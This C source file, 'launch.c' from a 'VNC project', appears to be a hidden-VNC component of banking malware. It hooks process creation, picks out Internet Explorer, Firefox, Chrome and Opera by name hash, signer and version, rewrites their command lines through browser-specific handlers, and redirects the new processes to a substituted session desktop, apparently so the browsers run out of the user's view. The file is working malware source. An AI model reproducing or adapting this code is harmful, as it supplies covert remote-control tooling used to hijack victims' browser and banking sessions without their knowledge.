//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: launch.c
// $Revision: 195 $
// $Date: 2014-07-11 16:56:29 +0400 (Пт, 11 июл 2014) $
// description:
//	Special known processes launch workaround.

#include "vncmain.h"

#include "vncwnd.h"
#include "vncsrv.h"
#include "vnc\ff.h"
#include "vnc\chrome.h"
#include "vnc\opera.h"
#include "vnc\ie.h"
#include "vnc\names.h"
#include "vnchook.h"
#include "..\acdll\activdll.h"

#include "rt\file.h"
#include "rt\certinfo.h"
#include "rt\str.h"
#include <malloc.h>

#define NEW_OPERA_VERSION 16
#define OLD_OPERA_VERSION 15

typedef WINERROR (*PCMDLINE_PROCW)(PVNC_SESSION pSession, LPCWSTR szPath,LPWSTR *pNewCommandLine);
typedef WINERROR (*PCMDLINE_PROCA)(PVNC_SESSION pSession, LPCSTR szPath,LPSTR *pNewCommandLine);

typedef BOOL (*PSTART_PROCW)(PVNC_SESSION pSession, LPCWSTR szPath);
typedef BOOL (*PSTART_PROCA)(PVNC_SESSION pSession, LPCSTR szPath);

typedef struct _PROCESS_LAUNCH_PARAMETERS
{
	//LPWSTR szProcessName;
	//int    szProcessNameLen;
	DWORD  ProcessNameHash;
	LPWSTR szPublicherName;
	PCMDLINE_PROCW CmdLineProcW;
	PCMDLINE_PROCA CmdLineProcA;
	PSTART_PROCW StartProcW;
	PSTART_PROCA StartProcA;
	WORD   MinMajor; // min major
	WORD   MaxMajor;
}PROCESS_LAUNCH_PARAMETERS,*PPROCESS_LAUNCH_PARAMETERS;

PROCESS_LAUNCH_PARAMETERS LaunchParams[] =
{
	{
		HOST_IEXPLORE, // wczIexplore, cstrlenW(wczIexplore),
		wczIexplorePublisher, 
		IE_GetCommandLineW, IE_GetCommandLineA, NULL, NULL,
		0,0
	},
	{
		HOST_FIREFOX, // wczFirefox, cstrlenW(wczFirefox),
		wczFirefoxPublisher,
		FF_GetCommandLineW, FF_GetCommandLineA, NULL, NULL,
		0,0
	},	
	{
		HOST_CHROME, //wczChrome, cstrlenW(wczChrome), 
		wczChromePublisher,
		CR_GetCommandLineW, CR_GetCommandLineA, NULL, NULL,
		0,0
	},
	{
		HOST_LAUNCHER, //wczOpera16, cstrlenW(wczOpera16), 
		wczOperaPublisher,
		NewOPR_GetCommandLineW, NewOPR_GetCommandLineA, NULL, NULL,
		NEW_OPERA_VERSION,0
	},
	{
		HOST_OPERA, //wczOpera, cstrlenW(wczOpera), 
		wczOperaPublisher,
		NULL, NULL, OPR_LaunchW, OPR_LaunchA,
		0,OLD_OPERA_VERSION
	},
	{
		0, 0, NULL
	}
};

WINERROR
	_GetProcessLauncher(
		IN LPWSTR lpApplicationName,
		OUT PPROCESS_LAUNCH_PARAMETERS *ppParams
		)
{	
	WINERROR Error = NO_ERROR;
	PPROCESS_LAUNCH_PARAMETERS Params = NULL;
	LPWSTR szProcess;

	CERT_PUBLISHERINFO PublisherInfo = { 0 };	
	WORD Major = 0;
	BOOL bHavePublisherInfo = FALSE;
	BOOL bHaveVersion = FALSE;
	BOOL bFound = FALSE;
	DWORD ProcessHash ;
	USES_CONVERSION;

	if (szProcess = wcsrchr(lpApplicationName, L'\\')){
		szProcess += 1;
	}else{
		szProcess = lpApplicationName;
	}

	// launching process from process
	if ( lstrcmpiW(szProcess,T2W(g_CurrentProcessName)) == 0 ){
		DbgPrint("Staring process from itself %S\n",szProcess);
		*ppParams = NULL;
		return NO_ERROR;
	}

	ProcessHash = StrHashA(W2A(szProcess));

	for ( Params = LaunchParams; Params->ProcessNameHash; Params ++ )
	{
		if ( Params->ProcessNameHash != ProcessHash ){
			continue;
		}

		if ( Params->szPublicherName ){
			if ( bHavePublisherInfo == FALSE ){
				Error = CryptExeSignerInfoW(lpApplicationName,&PublisherInfo);
				// winxp images are not signed
				if ( Error != CRYPT_E_NO_MATCH ){
					if ( Error != NO_ERROR ){
						break;
					}
					bHavePublisherInfo = TRUE;
				}
			}

			if ( bHavePublisherInfo && (PublisherInfo.lpszSubjectName == NULL ||
				lstrcmpiW(PublisherInfo.lpszSubjectName,Params->szPublicherName)))
			{
				continue;
			}
		}
		if ( Params->MinMajor || Params->MaxMajor ){
			if ( bHaveVersion == FALSE ){
				Error = FileGetVersionW(lpApplicationName,&Major,NULL,NULL,NULL);
				if ( Error != NO_ERROR ){
					break;
				}
				bHaveVersion = TRUE;
			}
			if ( Params->MinMajor && Params->MinMajor > Major ){
				continue;
			}
			if ( Params->MaxMajor && Params->MaxMajor < Major ){
				continue;
			}
		}
		Error = NO_ERROR;
		bFound = TRUE;
		break;
	}

	if ( bHavePublisherInfo )
	{
		if ( PublisherInfo.lpszSubjectName ){
			hFree ( PublisherInfo.lpszSubjectName );
		}
		if ( PublisherInfo.lpszProgramName ){
			hFree ( PublisherInfo.lpszProgramName );
		}
		if ( PublisherInfo.lpszPublisherLink ){
			hFree ( PublisherInfo.lpszPublisherLink );
		}
		if ( PublisherInfo.lpszMoreInfoLink ){
			hFree ( PublisherInfo.lpszMoreInfoLink );
		}
	}
	if ( Error == NO_ERROR ){
		if ( bFound ){
			*ppParams = Params;
		}else{
			*ppParams = NULL;
		}
	}
	return Error;
}

BOOL WINAPI VncOnCreateProcessW(
	LPWSTR lpApplicationName,
	LPWSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPWSTR lpCurrentDirectory,
	LPSTARTUPINFOW lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	)
{
	BOOL	Ret;
	BOOL	bCallCreateProcess = TRUE;
	LPWSTR	pOldDesktop = NULL,  pNewDesktop = NULL;
	LPWSTR	pNewCommandLine = NULL;
	int Length = 2; // \0 + ' '

	LPWSTR	pNewArgs = NULL;

	WINERROR Error = NO_ERROR;
	PPROCESS_LAUNCH_PARAMETERS LaunchParams = NULL;

	do 
	{
		if ( g_VncSharedSection.Data && lpStartupInfo && lpStartupInfo->lpDesktop)
		{
			pOldDesktop = lpStartupInfo->lpDesktop;
			pNewDesktop = lpStartupInfo->lpDesktop = DecorateDeskWinstaNameW(&g_pSession->Desktop, pOldDesktop);
		}

		if ( lpApplicationName ){
			Error = _GetProcessLauncher(lpApplicationName,&LaunchParams);
			if ( Error != NO_ERROR ){
				break;
			}
		}
		if ( LaunchParams )
		{
			if ( LaunchParams->CmdLineProcW )
			{
				Error = LaunchParams->CmdLineProcW(g_pSession,lpCommandLine,&pNewArgs);
				if ( Error != NO_ERROR ){
					break;
				}
				if ( lpCommandLine ){
					Length += lstrlenW(lpCommandLine);
				}
				if ( pNewArgs ){
					Length += lstrlenW(pNewArgs);
				}
				pNewCommandLine = hAlloc(Length*sizeof(WCHAR));
				if ( pNewCommandLine == NULL ){
					Error = ERROR_NOT_ENOUGH_MEMORY;
					break;
				}
				lstrcpyW(pNewCommandLine,lpCommandLine);
				lstrcatW(pNewCommandLine,L" ");
				lstrcatW(pNewCommandLine,pNewArgs);
				lpCommandLine = pNewCommandLine;
			}
			else if ( LaunchParams->StartProcW )
			{
				Ret = 
					LaunchParams->StartProcW(
						g_pSession,
						lpCommandLine
						);
				bCallCreateProcess = FALSE;
			} 
			else
			{
				Error = ERROR_ACCESS_DENIED;
				bCallCreateProcess = FALSE;
			}
		}
		
		if ( bCallCreateProcess )
		{
			Ret = 
				CallCreateProcessW(
					lpApplicationName, 
					lpCommandLine, 
					lpProcessAttributes,
					lpThreadAttributes, 
					bInheritHandles, 
					dwCreationFlags, 
					lpEnvironment, 
					lpCurrentDirectory, 
					lpStartupInfo, 
					lpProcessInformation
					);
		}
	}while ( FALSE );

	if ( pNewCommandLine ){
		hFree ( pNewCommandLine );
	}
	if ( pNewArgs ){
		hFree ( pNewArgs );
	}

	if (pOldDesktop)
		lpStartupInfo->lpDesktop = pOldDesktop;
	if (pNewDesktop && pNewDesktop != pOldDesktop)
		hFree(pNewDesktop);

	if ( Error != NO_ERROR ){
		SetLastError(Error);
		Ret = FALSE;
	}

	return(Ret);
}

BOOL WINAPI VncOnCreateProcessA(
	LPSTR lpApplicationName,
	LPSTR lpCommandLine,
	LPSECURITY_ATTRIBUTES lpProcessAttributes,
	LPSECURITY_ATTRIBUTES lpThreadAttributes,
	BOOL bInheritHandles,
	DWORD dwCreationFlags,
	LPVOID lpEnvironment,
	LPSTR lpCurrentDirectory,
	LPSTARTUPINFOA lpStartupInfo,
	LPPROCESS_INFORMATION lpProcessInformation
	)
{
	BOOL	Ret;
	BOOL	bCallCreateProcess = TRUE;
	LPSTR	pOldDesktop = NULL,  pNewDesktop = NULL;
	LPSTR	pNewCommandLine = NULL;
	int Length = 2; // \0 + ' '

	LPSTR	pNewArgs = NULL;

	WINERROR Error = NO_ERROR;
	PPROCESS_LAUNCH_PARAMETERS LaunchParams = NULL;
	USES_CONVERSION;

	do 
	{
		if ( g_VncSharedSection.Data && lpStartupInfo && lpStartupInfo->lpDesktop)
		{
			pOldDesktop = lpStartupInfo->lpDesktop;
			pNewDesktop = lpStartupInfo->lpDesktop = DecorateDeskWinstaNameA(&g_pSession->Desktop, pOldDesktop);
		}

		if ( lpApplicationName ){
			Error = _GetProcessLauncher(A2W(lpApplicationName),&LaunchParams);
			if ( Error != NO_ERROR ){
				break;
			}
		}
		if ( LaunchParams )
		{
			if ( LaunchParams->CmdLineProcA )
			{
				Error = LaunchParams->CmdLineProcA(g_pSession,lpCommandLine,&pNewArgs);
				if ( Error != NO_ERROR ){
					break;
				}
				if ( lpCommandLine ){
					Length += lstrlenA(lpCommandLine);
				}
				if ( pNewArgs ){
					Length += lstrlenA(pNewArgs);
				}
				pNewCommandLine = hAlloc(Length*sizeof(CHAR));
				if ( pNewCommandLine == NULL ){
					Error = ERROR_NOT_ENOUGH_MEMORY;
					break;
				}
				lstrcpyA(pNewCommandLine,lpCommandLine);
				lstrcatA(pNewCommandLine," ");
				lstrcatA(pNewCommandLine,pNewArgs);
				lpCommandLine = pNewCommandLine;
			}
			else if ( LaunchParams->StartProcA )
			{
				Ret = 
					LaunchParams->StartProcA(
						g_pSession,
						lpCommandLine
						);
				bCallCreateProcess = FALSE;
			} 
			else
			{
				Error = ERROR_ACCESS_DENIED;
				bCallCreateProcess = FALSE;
			}
		}
		
		if ( bCallCreateProcess )
		{
			Ret = 
				CallCreateProcessA(
					lpApplicationName, 
					lpCommandLine, 
					lpProcessAttributes,
					lpThreadAttributes, 
					bInheritHandles, 
					dwCreationFlags, 
					lpEnvironment, 
					lpCurrentDirectory, 
					lpStartupInfo, 
					lpProcessInformation
					);
		}
	}while ( FALSE );

	if ( pNewCommandLine ){
		hFree ( pNewCommandLine );
	}
	if ( pNewArgs ){
		hFree ( pNewArgs );
	}

	if (pOldDesktop)
		lpStartupInfo->lpDesktop = pOldDesktop;
	if (pNewDesktop && pNewDesktop != pOldDesktop)
		hFree(pNewDesktop);

	if ( Error != NO_ERROR ){
		SetLastError(Error);
		Ret = FALSE;
	}

	return(Ret);
}



LPWSTR WINAPI VncChangeDesktopNameW(
	LPSTARTUPINFOW	lpStartupInfo
	)
{
	LPWSTR	pNewDesktop = NULL;

	if (g_VncSharedSection.Data && lpStartupInfo && lpStartupInfo->lpDesktop)
		pNewDesktop = DecorateDeskWinstaNameW(&g_pSession->Desktop, lpStartupInfo->lpDesktop);

	return(pNewDesktop);
}

LPSTR WINAPI VncChangeDesktopNameA(
	LPSTARTUPINFOA	lpStartupInfo
	)
{
	LPSTR	pNewDesktop = NULL;

	if (g_VncSharedSection.Data && lpStartupInfo && lpStartupInfo->lpDesktop)
		pNewDesktop = DecorateDeskWinstaNameA(&g_pSession->Desktop, lpStartupInfo->lpDesktop);

	return(pNewDesktop);
}




